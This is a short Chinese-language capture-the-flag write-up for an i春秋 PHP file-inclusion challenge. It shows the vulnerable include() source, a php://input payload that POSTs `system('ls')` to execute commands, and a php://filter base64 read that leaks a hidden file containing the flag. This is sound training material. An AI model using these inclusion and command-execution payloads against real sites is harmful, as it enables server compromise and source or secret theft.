# 原创
：  Web include ＜=＞ i春秋

# Web include ＜=＞ i春秋

题目给的源码

```
&lt;?php 
show_source(__FILE__);
if(isset($_REQUEST['path'])){
    include($_REQUEST['path']);
}else{
    include('phpinfo.php');
}


```

首先，试了试直接`?path=flag.php`没有回显。<br/> 然后通过phpinfo给出的内容`allow_url_include处于打开状态`，想到利用php的伪协议。<br/> 用`?path=php://input`，然后POST进一段话`&lt;?php system('ls');?&gt;`，得到信息。

```
&lt;?php 
show_source(__FILE__);
if(isset($_REQUEST['path'])){
    include($_REQUEST['path']);
}else{
    include('phpinfo.php');
}
dle345aae.php index.php phpinfo.php

```

然后我们利用playload`http://126410e39dee45e495457edd437bccd171781fb04de9403a.changame.ichunqiu.com/?path=php://filter/read=convert.base64-encode/resource=./dle345aae.php`<br/> 得到`PD9waHAgCiRmbGFnPSJmbGFnezIwM2YwMmQwLWI4OTQtNDc2Zi1hZWQ0LThlN2FkNjMxMzRjYX0iOwo=`<br/> 解码`&lt;?php $flag="flag{203f02d0-b894-476f-aed4-8e7ad63134ca}";`
